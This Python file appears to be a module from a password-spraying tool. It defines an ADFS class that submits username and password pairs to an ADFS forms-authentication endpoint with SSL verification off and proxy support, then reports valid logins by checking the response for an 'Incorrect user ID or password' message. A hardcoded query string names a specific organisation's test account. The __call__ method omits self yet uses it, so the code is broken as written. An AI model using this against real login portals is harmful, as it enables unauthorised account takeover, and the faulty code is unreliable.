from re import search
import requests
import warnings
import urllib
warnings.filterwarnings('ignore')

class ADFS():

    def __init__(self,url,headers={},proxies={},verify_ssl=False,timeout=5):
        
        self.url = url
        self.headers = headers
        self.proxies = proxies
        self.verify_ssl = verify_ssl
        self.timeout = timeout

    def __call__(username,password):
    
        # query string
        query = urllib.parse.unquote('client-request-id=826a908e-c842-488c-8ade-'\
            '3a95778dd5cc&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnli'\
            'ne&wctx=LoginOptions%3D3%26estsredirect%3d2%26estsrequest%3drQIIAY2'\
            'Rv4vTUADHL00vcjeoiDi46CAIQpqXvDS_QDCv7V25pkRbQ69dyiXNS5tr-mLz0pQiCE'\
            '5yqHRxcdPBoaM4iH-BHA5dXDo4OImTON2mLS5u-h0-fNfv53uLFQuicQP8icRvyAOMR'\
            'd7zN-2vjC_tXnw-Dx-jj0-rJ1-MF9mzz58WzLU-pXFiCAJJ6ZCQ4wLBeOD5BY9EAsmO'\
            'hPcMs2SYRU5VoKIpmippxXXRoazrBVAEut7DHi9BHfKyhyGvu1qRF6HoAs3DiuxKq9w'\
            'F20xpX9qAjAcz_2duB5Nx1I1JQl-yD8vtyUG5bQYVE6GBatbQXmTDtj9Fs8Ts26E13U'\
            'cJhLDeKcthv2GG9Vm5mVTu1StlFFA7KJbQrOFaWd8exo29YODUMuB0cONB0HRcqyTJb'\
            'qnVPVaVbmxhoI_sybR76ACK-cldp7pg_8vcW5Zb64jI6JTlSOyPBr2v7BXqJ5TciXrp'\
            '2E9IOvb8ZONsmWe-53Pg_Fmeeb29Fv7m5PDX2fJq7R19BR-tbm6dbgv-_kiwAoCEo7B'\
            'Vkogz9YdBZqOD-8VpNaw1O8ikba9EYSvVbkNDnHPMnOO-ccwPjnlybuvDzr8eW-1elo'\
            'Co8-tNknpdlA0gGgB2fgM1&cbcxt=&username=testo%40mduresources.com&mkt'\
            '=&lc=')
        
        # post data
        data = {
            'UserName':username,
            'Password':password,
            'AuthMethod':'FormsAuthentication',
        }
    
        try:
        
            # make the request
            resp = requests.post(
                self.url+f'?{query}',
                data=data,
                headers=self.headers,
                verify=self.verify_ssl,
                allow_redirects=False,
                proxies=self.proxies,
                timeout=self.timeout
            )
        
        # handle timeout exception (dragons be here tbh)
        except requests.exceptions.Timeout as e:
    
            return [0,username,password]
    
        # verify credentials and return outcome
        if not resp.text or (resp.text and search(r'Incorrect user ID or password',resp.text)):
            return [0, username, password]
        else:
            return [1, username, password]
